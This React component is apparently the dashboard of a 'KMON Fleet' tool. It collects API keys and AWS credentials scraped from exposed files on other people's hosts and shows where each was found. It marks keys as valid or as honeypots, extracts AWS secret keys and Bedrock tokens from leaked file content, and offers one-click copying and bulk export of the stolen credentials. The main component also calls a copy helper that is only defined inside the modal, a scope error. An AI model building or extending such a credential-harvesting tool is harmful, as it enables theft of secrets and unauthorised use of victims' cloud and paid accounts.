import React, { useState, useEffect, useCallback, useRef } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { toast } from "sonner";
import {
  RefreshCw, Search, X, Copy, Eye, EyeOff, ExternalLink, CheckCircle2,
  AlertCircle, HelpCircle, Clock, Server, FileCode, Globe, Hash,
  Key, Info, Download, ChevronLeft, ChevronRight,
} from "lucide-react";

// ── Types ──────────────────────────────────────────────────────────────────────

interface FleetKey {
  id: string;
  serverId: string;
  serverName: string;
  type: string;
  key?: string | null;
  keyMasked?: string | null;
  service?: string | null;
  category?: string | null;
  status: string;
  firstSeenAt: string;
  validatedAt?: string | null;
  awsBedrockAccess?: boolean;
  awsAccountId?: string | null;
  awsArn?: string | null;
  source: string;
  url?: string;
}

interface FleetPage {
  items: FleetKey[];
  total: number;
  page: number;
  pages: number;
}

interface FleetServer {
  id: string;
  name: string;
  url: string;
  enabled: boolean;
  online: boolean;
}

// ── Helpers ────────────────────────────────────────────────────────────────────

function getStatusBadge(status: string) {
  switch (status) {
    case "valid":
      return <Badge className="bg-emerald-500/10 text-emerald-500 border-emerald-500/20"><CheckCircle2 className="w-3 h-3 mr-1" />VALID</Badge>;
    case "invalid":
      return <Badge variant="destructive" className="bg-destructive/10 text-destructive border-destructive/20"><AlertCircle className="w-3 h-3 mr-1" />INVALID</Badge>;
    case "rate_limited":
      return <Badge className="bg-yellow-500/10 text-yellow-500 border-yellow-500/20"><Clock className="w-3 h-3 mr-1" />RATE LTD</Badge>;
    case "honeypot":
      return <Badge className="bg-purple-500/10 text-purple-400 border-purple-500/20"><AlertCircle className="w-3 h-3 mr-1" />HONEYPOT</Badge>;
    default:
      return <Badge variant="secondary" className="bg-muted text-muted-foreground border-border"><HelpCircle className="w-3 h-3 mr-1" />UNCHECKED</Badge>;
  }
}

function ServerBadge({ name, online }: { name: string; online?: boolean }) {
  return (
    <span className={`inline-flex items-center gap-1 text-[10px] font-mono px-1.5 py-0.5 rounded border ${
      online !== false
        ? "bg-primary/5 text-primary/70 border-primary/20"
        : "bg-muted text-muted-foreground border-border"
    }`}>
      <span className={`w-1 h-1 rounded-full ${online !== false ? "bg-primary" : "bg-muted-foreground"}`} />
      {name}
    </span>
  );
}

// ── Detail Modal ───────────────────────────────────────────────────────────────

function FleetDetailModal({
  item,
  open,
  onClose,
}: {
  item: FleetKey | null;
  open: boolean;
  onClose: () => void;
}) {
  const [detail, setDetail] = useState<Record<string, unknown> | null>(null);
  const [loading, setLoading] = useState(false);
  const [revealed, setRevealed] = useState(false);

  useEffect(() => {
    if (!open || !item) { setDetail(null); setRevealed(false); return; }
    setLoading(true);
    fetch(`/api/fleet/results/${item.serverId}/${item.id}`)
      .then((r) => r.json())
      .then((d) => setDetail(d as Record<string, unknown>))
      .catch(() => toast.error("Failed to load details"))
      .finally(() => setLoading(false));
  }, [open, item]);

  // Works on HTTP and HTTPS (opacity:0.001 makes execCommand work in all browsers)
  const copy = (text: string, label = "Copied") => {
    if (!text) return;
    if (navigator.clipboard?.writeText) {
      navigator.clipboard.writeText(text).then(() => toast.success(label)).catch(() => execCopyFR(text, label));
    } else {
      execCopyFR(text, label);
    }
  };
  const execCopyFR = (text: string, label: string) => {
    try {
      const ta = document.createElement("textarea");
      ta.value = text;
      ta.style.cssText = "position:fixed;top:0;left:0;width:2em;height:2em;padding:0;border:none;outline:none;box-shadow:none;background:transparent;opacity:0.001;z-index:9999";
      document.body.appendChild(ta); ta.focus(); ta.select();
      const ok = document.execCommand("copy");
      document.body.removeChild(ta);
      if (ok) toast.success(label);
      else toast.info(`Copy manually: ${text.slice(0, 40)}${text.length > 40 ? "…" : ""}`);
    } catch { toast.error("Copy failed"); }
  };

  if (!item) return null;

  // AWS credentials parsing
  const isAws = item.service === "aws";
  const contentPreview = (detail?.envDetail as Record<string, unknown> | null)?.contentPreview as string ?? "";
  const rawKey = String(detail?.key ?? item.key ?? "");
  const keyMasked = String(detail?.keyMasked ?? item.keyMasked ?? "");

  const parseAwsCred = (label: string, re: RegExp) => {
    const m = re.exec(contentPreview);
    return m ? m[1] : "";
  };
  const awsSecret  = parseAwsCred("secret",  /AWS_SECRET_ACCESS_KEY\s*[=:]\s*["']?([A-Za-z0-9/+=]{20,60})["']?/i);
  const awsBedrock = parseAwsCred("bedrock", /AWS_BEARER_TOKEN_BEDROCK\s*[=:]\s*["']?([A-Za-z0-9/+=]{40,})["']?/i);

  const awsCredsText = [
    rawKey ? `AWS_ACCESS_KEY_ID=${rawKey}` : "",
    awsSecret ? `AWS_SECRET_ACCESS_KEY=${awsSecret}` : "",
    awsBedrock ? `AWS_BEARER_TOKEN_BEDROCK=${awsBedrock}` : "",
  ].filter(Boolean).join("\n");

  const mask = (v: string) => v.length > 10 ? `${v.slice(0, 6)}…${v.slice(-4)}` : "••••";

  const envDetail = detail?.envDetail as Record<string, unknown> | null;
  const envUrl = String(envDetail?.url ?? detail?.url ?? item.url ?? "");
  const host   = String(envDetail?.host ?? "");
  const filePath = String(envDetail?.path ?? "");

  return (
    <Dialog open={open} onOpenChange={(v) => { if (!v) onClose(); }}>
      <DialogContent className="max-w-2xl w-full max-h-[90vh] overflow-y-auto bg-card border-border font-mono">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2 text-sm font-mono">
            <Key className="w-4 h-4 text-primary" />
            <span className="text-primary uppercase">{item.service ?? "KEY"}</span>
            {item.awsBedrockAccess && (
              <span className="text-[10px] px-1.5 py-0.5 rounded border border-orange-500/40 bg-orange-500/10 text-orange-300">🟠 BEDROCK</span>
            )}
            <ServerBadge name={item.serverName} />
            <span className="ml-auto">{getStatusBadge(item.status)}</span>
          </DialogTitle>
        </DialogHeader>

        {loading && <div className="py-10 text-center text-muted-foreground text-xs animate-pulse">LOADING…</div>}

        {!loading && (
          <div className="space-y-4 text-xs">
            {/* KEY section */}
            {isAws && contentPreview ? (
              <section className="space-y-1">
                <div className="text-muted-foreground flex items-center gap-1 mb-1">
                  <Hash className="w-3 h-3" /> AWS CREDENTIALS
                  {item.awsAccountId && (
                    <span className="ml-2 text-[10px] px-1 py-0.5 rounded bg-muted border border-border text-muted-foreground">{item.awsAccountId}</span>
                  )}
                  <div className="ml-auto flex gap-1">
                    <Button variant="ghost" size="icon" className="h-6 w-6 text-muted-foreground hover:text-foreground"
                      onClick={() => setRevealed((r) => !r)}>
                      {revealed ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                    </Button>
                    <Button variant="ghost" size="icon" className="h-6 w-6 text-muted-foreground hover:text-foreground"
                      onClick={() => copy(awsCredsText, "AWS credentials copied")}>
                      <Copy className="w-3 h-3" />
                    </Button>
                  </div>
                </div>
                <div className="bg-background border border-orange-500/20 rounded p-3 space-y-1.5 font-mono text-[11px]">
                  {[
                    { label: "AWS_ACCESS_KEY_ID", value: rawKey, color: "text-primary font-bold" },
                    { label: "AWS_SECRET_ACCESS_KEY", value: awsSecret, color: "text-amber-300" },
                    ...(awsBedrock ? [{ label: "AWS_BEARER_TOKEN_BEDROCK", value: awsBedrock, color: "text-orange-300" }] : []),
                  ].filter((row) => row.value).map((row) => (
                    <div key={row.label} className="flex items-start gap-2">
                      <span className="text-muted-foreground/60 w-[180px] shrink-0">{row.label}</span>
                      <code className={`flex-1 break-all select-all ${row.color}`}>
                        {revealed ? row.value : mask(row.value)}
                      </code>
                      <Button variant="ghost" size="icon" className="h-5 w-5 shrink-0 text-muted-foreground hover:text-foreground"
                        onClick={() => copy(row.value, `${row.label} copied`)}>
                        <Copy className="w-2.5 h-2.5" />
                      </Button>
                    </div>
                  ))}
                  {awsCredsText && (
                    <div className="pt-2 border-t border-border/40">
                      <Button variant="outline" size="sm"
                        className="w-full h-7 text-[10px] font-mono border-orange-500/30 text-orange-300 hover:bg-orange-500/10 gap-1"
                        onClick={() => copy(awsCredsText, "All AWS credentials copied ✓")}>
                        <Copy className="w-3 h-3" /> COPY ALL CREDENTIALS
                      </Button>
                    </div>
                  )}
                </div>
                {item.awsArn && (
                  <div className="text-[10px] text-muted-foreground font-mono px-1">
                    ARN: <span className="text-foreground/60">{item.awsArn}</span>
                  </div>
                )}
              </section>
            ) : (
              <section className="space-y-1">
                <div className="text-muted-foreground flex items-center gap-1 mb-1"><Hash className="w-3 h-3" /> KEY</div>
                <div className="flex items-center gap-2 bg-background border border-border rounded p-2">
                  <code className="flex-1 break-all text-foreground select-all">
                    {revealed ? (rawKey || keyMasked) : keyMasked}
                  </code>
                  <Button variant="ghost" size="icon" className="h-6 w-6 text-muted-foreground hover:text-foreground"
                    onClick={() => setRevealed((r) => !r)}>
                    {revealed ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                  </Button>
                  <Button variant="ghost" size="icon" className="h-6 w-6 text-muted-foreground hover:text-foreground"
                    onClick={() => copy(rawKey || keyMasked, "Copied")}>
                    <Copy className="w-3 h-3" />
                  </Button>
                </div>
              </section>
            )}

            {/* Source */}
            <section className="space-y-1">
              <div className="text-muted-foreground flex items-center gap-1 mb-1"><Info className="w-3 h-3" /> SOURCE</div>
              <div className="grid grid-cols-[auto_1fr] gap-x-3 gap-y-1 bg-background border border-border rounded p-3">
                <span className="text-muted-foreground">Server</span>
                <ServerBadge name={item.serverName} />
                {host && (
                  <>
                    <span className="text-muted-foreground"><Server className="w-3 h-3 inline mr-1" />Host</span>
                    <span className="text-primary break-all">{host}</span>
                  </>
                )}
                {filePath && (
                  <>
                    <span className="text-muted-foreground"><FileCode className="w-3 h-3 inline mr-1" />Path</span>
                    <span className="text-amber-400">{filePath}</span>
                  </>
                )}
                {envUrl && (
                  <>
                    <span className="text-muted-foreground"><Globe className="w-3 h-3 inline mr-1" />URL</span>
                    <span className="break-all">
                      <a href={envUrl} target="_blank" rel="noreferrer"
                        className="text-secondary hover:underline inline-flex items-center gap-1">
                        {envUrl.length > 70 ? envUrl.slice(0, 70) + "…" : envUrl}
                        <ExternalLink className="w-3 h-3 shrink-0" />
                      </a>
                    </span>
                  </>
                )}
                <span className="text-muted-foreground">First seen</span>
                <span className="text-foreground">{new Date(item.firstSeenAt).toLocaleString()}</span>
              </div>
            </section>

            {/* File content */}
            {contentPreview && (
              <section className="space-y-1">
                <div className="text-muted-foreground flex items-center gap-2 mb-1">
                  <FileCode className="w-3 h-3" /> FILE CONTENT
                  <Button variant="ghost" size="icon" className="h-5 w-5 ml-auto text-muted-foreground hover:text-foreground"
                    onClick={() => copy(contentPreview, "Content copied")}>
                    <Copy className="w-2.5 h-2.5" />
                  </Button>
                </div>
                <pre className="bg-background border border-border rounded p-3 text-[11px] leading-relaxed whitespace-pre-wrap break-all text-foreground/80 max-h-40 overflow-auto">
                  {contentPreview}
                </pre>
              </section>
            )}

            <div className="flex gap-2 pt-1 border-t border-border">
              {envUrl && (
                <Button size="sm" variant="outline"
                  className="h-7 text-xs font-mono border-secondary/30 text-secondary hover:bg-secondary/10"
                  onClick={() => window.open(envUrl, "_blank", "noreferrer")}>
                  <ExternalLink className="w-3 h-3 mr-1" /> OPEN URL
                </Button>
              )}
              <Button size="sm" variant="ghost" className="h-7 text-xs font-mono ml-auto text-muted-foreground" onClick={onClose}>
                CLOSE
              </Button>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}

// ── Main component ─────────────────────────────────────────────────────────────

const CATEGORIES = ["ai","payments","crypto","email","cloud","auth","messaging","database","storage"];

export default function FleetResults() {
  const [location] = useLocation();

  // Parse server filter from URL
  const urlParams = new URLSearchParams(typeof window !== "undefined" ? window.location.search : "");
  const initServer = urlParams.get("server") ?? "all";

  const [page, setPage]           = useState(1);
  const [status, setStatus]       = useState("valid");
  const [service, setService]     = useState("all");
  const [category, setCategory]   = useState("all");
  const [serverFilter, setServerFilter] = useState(initServer);
  const [bedrockOnly, setBedrockOnly]   = useState(false);
  const [keySearch, setKeySearch] = useState("");
  const [keySearchInput, setKeySearchInput] = useState("");
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const [data, setData]     = useState<FleetPage | null>(null);
  const [loading, setLoading] = useState(false);
  const [servers, setServers] = useState<FleetServer[]>([]);
  const [selectedItem, setSelectedItem] = useState<FleetKey | null>(null);

  // Load fleet server list for filter dropdown
  useEffect(() => {
    fetch("/api/fleet/servers/status")
      .then((r) => r.json())
      .then((d: { servers: FleetServer[] }) => setServers(d.servers ?? []))
      .catch(() => { /* ignore */ });
  }, []);

  const fetchResults = useCallback(
    async (params: {
      page: number; status: string; service: string; category: string;
      server: string; bedrock: boolean; keySearch: string;
    }) => {
      setLoading(true);
      try {
        const q = new URLSearchParams({
          page: String(params.page), limit: "50",
          ...(params.status   !== "all" ? { status:   params.status }   : {}),
          ...(params.service  !== "all" ? { service:  params.service }  : {}),
          ...(params.category !== "all" ? { category: params.category } : {}),
          ...(params.server   !== "all" ? { server:   params.server }   : {}),
          ...(params.bedrock ? { bedrock: "1" } : {}),
          ...(params.keySearch ? { keySearch: params.keySearch } : {}),
        });
        const r = await fetch(`/api/fleet/results?${q}`);
        const d = await r.json() as FleetPage;
        setData(d);
      } catch {
        toast.error("Failed to load fleet results");
      } finally {
        setLoading(false);
      }
    },
    [],
  );

  useEffect(() => {
    void fetchResults({ page, status, service, category, server: serverFilter, bedrock: bedrockOnly, keySearch });
  }, [fetchResults, page, status, service, category, serverFilter, bedrockOnly, keySearch]);

  const handleKeySearchChange = (val: string) => {
    setKeySearchInput(val);
    if (debounceRef.current) clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(() => { setKeySearch(val); setPage(1); }, 400);
  };

  const serverName = (id: string) => servers.find((s) => s.id === id)?.name ?? id;
  const serverOnline = (id: string) => servers.find((s) => s.id === id)?.online;

  const handleExport = async () => {
    toast.info("Preparing export…");
    try {
      const q = new URLSearchParams({
        limit: "99999",
        ...(status   !== "all" ? { status }   : {}),
        ...(service  !== "all" ? { service }  : {}),
        ...(category !== "all" ? { category } : {}),
        ...(serverFilter !== "all" ? { server: serverFilter } : {}),
        ...(bedrockOnly ? { bedrock: "1" } : {}),
        ...(keySearch ? { keySearch } : {}),
      });
      const r = await fetch(`/api/fleet/results?${q}`);
      const d = await r.json() as FleetPage;

      const lines = [
        `KMON Fleet Export — ${new Date().toISOString()}`,
        `Total: ${d.total} | Filters: status=${status} service=${service}`,
        "=".repeat(80), "",
        ...d.items.map((item, i) => [
          `[${i + 1}] ${item.serverName} | ${(item.service ?? "?").toUpperCase()} | ${item.status.toUpperCase()} | ${new Date(item.firstSeenAt).toLocaleString()}`,
          `    ${item.key || item.keyMasked || ""}`,
          item.url ? `    ${item.url}` : "",
          "",
        ].filter(Boolean).join("\n")),
      ];

      const blob = new Blob([lines.join("\n")], { type: "text/plain;charset=utf-8" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url; a.download = `kmon-fleet-${new Date().toISOString().slice(0, 10)}.txt`;
      document.body.appendChild(a); a.click(); document.body.removeChild(a);
      URL.revokeObjectURL(url);
      toast.success(`Exported ${d.total} keys`);
    } catch {
      toast.error("Export failed");
    }
  };

  return (
    <div className="space-y-4 h-full flex flex-col">
      {/* Detail modal */}
      <FleetDetailModal
        item={selectedItem}
        open={selectedItem !== null}
        onClose={() => setSelectedItem(null)}
      />

      {/* Search */}
      <div className="relative flex items-center gap-2 bg-card px-4 py-2.5 border border-border rounded-lg">
        <Search className="w-4 h-4 text-muted-foreground shrink-0" />
        <Input
          value={keySearchInput}
          onChange={(e) => handleKeySearchChange(e.target.value)}
          placeholder="Search across all servers…"
          className="flex-1 h-7 bg-transparent border-none shadow-none focus-visible:ring-0 font-mono text-xs px-0"
          autoComplete="off"
        />
        {keySearchInput && (
          <button onClick={() => { setKeySearchInput(""); setKeySearch(""); setPage(1); }}
            className="text-muted-foreground hover:text-foreground">
            <X className="w-3.5 h-3.5" />
          </button>
        )}
        {keySearch && (
          <span className="text-[10px] font-mono text-primary border border-primary/30 bg-primary/10 rounded px-1.5 py-0.5">
            {data?.total ?? "…"} results
          </span>
        )}
      </div>

      {/* Filters */}
      <div className="flex flex-wrap items-center gap-2 bg-card p-3 border border-border rounded-lg">
        {/* Server filter */}
        <Select value={serverFilter} onValueChange={(v) => { setServerFilter(v); setPage(1); }}>
          <SelectTrigger className="w-[150px] bg-background border-border font-mono text-xs uppercase h-8">
            <SelectValue placeholder="Server" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">ALL SERVERS</SelectItem>
            {servers.filter((s) => s.enabled).map((s) => (
              <SelectItem key={s.id} value={s.id}>
                <span className="flex items-center gap-1.5 font-mono text-xs">
                  <span className={`w-1.5 h-1.5 rounded-full ${s.online ? "bg-emerald-400" : "bg-destructive"}`} />
                  {s.name}
                </span>
              </SelectItem>
            ))}
          </SelectContent>
        </Select>

        {/* Status */}
        <Select value={status} onValueChange={(v) => { setStatus(v); setPage(1); }}>
          <SelectTrigger className="w-[130px] bg-background border-border font-mono text-xs uppercase h-8">
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">ALL STATUS</SelectItem>
            <SelectItem value="valid">VALID</SelectItem>
            <SelectItem value="unchecked">UNCHECKED</SelectItem>
            <SelectItem value="invalid">INVALID</SelectItem>
          </SelectContent>
        </Select>

        {/* Category */}
        <Select value={category} onValueChange={(v) => { setCategory(v); setService("all"); setPage(1); }}>
          <SelectTrigger className="w-[130px] bg-background border-border font-mono text-xs uppercase h-8">
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">ALL CATS</SelectItem>
            {CATEGORIES.map((c) => (
              <SelectItem key={c} value={c}>{c.toUpperCase()}</SelectItem>
            ))}
          </SelectContent>
        </Select>

        {/* Bedrock */}
        <button
          onClick={() => { setBedrockOnly((b) => !b); setPage(1); }}
          className={`flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-mono border rounded h-8 transition-colors ${
            bedrockOnly
              ? "bg-orange-500/20 text-orange-300 border-orange-500/50"
              : "bg-background text-muted-foreground border-border hover:text-foreground"
          }`}
        >
          🟠 BEDROCK{bedrockOnly ? " ✓" : ""}
        </button>

        <div className="ml-auto flex gap-2">
          <Button variant="outline" size="sm" className="h-8 font-mono text-xs gap-1"
            onClick={() => void fetchResults({ page, status, service, category, server: serverFilter, bedrock: bedrockOnly, keySearch })}>
            <RefreshCw className="w-3 h-3" /> Refresh
          </Button>
          <Button variant="outline" size="sm" className="h-8 font-mono text-xs gap-1" onClick={handleExport}>
            <Download className="w-3 h-3" /> Export
          </Button>
        </div>
      </div>

      {/* Table */}
      <div className="border border-border rounded-lg bg-card flex-1 overflow-hidden flex flex-col">
        <div className="flex-1 overflow-auto">
          <Table>
            <TableHeader className="bg-muted/50 sticky top-0 z-10">
              <TableRow className="border-border hover:bg-transparent">
                <TableHead className="font-mono text-xs text-muted-foreground w-[120px]">SERVER</TableHead>
                <TableHead className="font-mono text-xs text-muted-foreground w-[100px]">SERVICE</TableHead>
                <TableHead className="font-mono text-xs text-muted-foreground min-w-[240px]">KEY</TableHead>
                <TableHead className="font-mono text-xs text-muted-foreground w-[100px]">STATUS</TableHead>
                <TableHead className="font-mono text-xs text-muted-foreground text-right w-[140px]">FIRST SEEN</TableHead>
                <TableHead className="font-mono text-xs text-muted-foreground text-right w-[60px]">INFO</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {loading ? (
                <TableRow>
                  <TableCell colSpan={6} className="text-center py-10 text-muted-foreground font-mono animate-pulse">
                    LOADING FROM {servers.filter((s) => s.enabled).length} SERVERS…
                  </TableCell>
                </TableRow>
              ) : data?.items.length === 0 ? (
                <TableRow>
                  <TableCell colSpan={6} className="text-center py-10 text-muted-foreground font-mono">
                    NO RESULTS
                  </TableCell>
                </TableRow>
              ) : (
                data?.items.map((item) => (
                  <TableRow
                    key={`${item.serverId}/${item.id}`}
                    className="border-border hover:bg-muted/30 cursor-pointer"
                    onClick={() => setSelectedItem(item)}
                  >
                    <TableCell>
                      <ServerBadge name={item.serverName} online={serverOnline(item.serverId)} />
                    </TableCell>
                    <TableCell className="font-mono text-xs text-primary font-bold">
                      {(item.service ?? "?").toUpperCase()}
                      {item.awsBedrockAccess && (
                        <span className="ml-1 text-[9px] text-orange-400">🟠</span>
                      )}
                    </TableCell>
                    <TableCell className="font-mono text-xs">
                      <div className="flex items-center gap-2 group" onClick={(e) => e.stopPropagation()}>
                        <code className="bg-background px-2 py-1 rounded border border-border text-foreground group-hover:text-primary transition-colors">
                          {item.keyMasked ?? item.key ?? "—"}
                        </code>
                        <button
                          className="opacity-0 group-hover:opacity-100 transition-opacity text-muted-foreground hover:text-foreground"
                          onClick={() => {
                            const val = item.key ?? item.keyMasked ?? "";
                            if (navigator.clipboard?.writeText) {
                              navigator.clipboard.writeText(val).then(() => toast.success("Copied")).catch(() => execCopyFR(val, "Copied"));
                            } else { execCopyFR(val, "Copied"); }
                          }}
                        >
                          <Copy className="h-3 w-3" />
                        </button>
                      </div>
                    </TableCell>
                    <TableCell onClick={(e) => e.stopPropagation()}>
                      {getStatusBadge(item.status)}
                    </TableCell>
                    <TableCell className="font-mono text-xs text-muted-foreground text-right">
                      {new Date(item.firstSeenAt).toLocaleString()}
                    </TableCell>
                    <TableCell className="text-right" onClick={(e) => e.stopPropagation()}>
                      <Button variant="ghost" size="icon" className="h-7 w-7 text-muted-foreground hover:text-primary"
                        onClick={() => setSelectedItem(item)}>
                        <Info className="h-3.5 w-3.5" />
                      </Button>
                    </TableCell>
                  </TableRow>
                ))
              )}
            </TableBody>
          </Table>
        </div>

        {/* Pagination */}
        <div className="border-t border-border p-3 bg-muted/10 flex items-center justify-between">
          <div className="text-xs text-muted-foreground font-mono">
            {data ? (
              <>
                {(page - 1) * 50 + 1}–{Math.min(page * 50, data.total)} of {data.total.toLocaleString()}
                {" · "}{servers.filter((s) => s.enabled).length} servers
              </>
            ) : "—"}
          </div>
          <div className="flex gap-2">
            <Button variant="outline" size="sm" className="h-7 font-mono text-xs gap-1"
              onClick={() => setPage((p) => Math.max(1, p - 1))} disabled={page === 1 || loading}>
              <ChevronLeft className="w-3.5 h-3.5" /> PREV
            </Button>
            <div className="px-3 flex items-center text-xs font-mono bg-background border border-border rounded">
              {page} / {data?.pages ?? 1}
            </div>
            <Button variant="outline" size="sm" className="h-7 font-mono text-xs gap-1"
              onClick={() => setPage((p) => p + 1)} disabled={page >= (data?.pages ?? 1) || loading}>
              NEXT <ChevronRight className="w-3.5 h-3.5" />
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
}
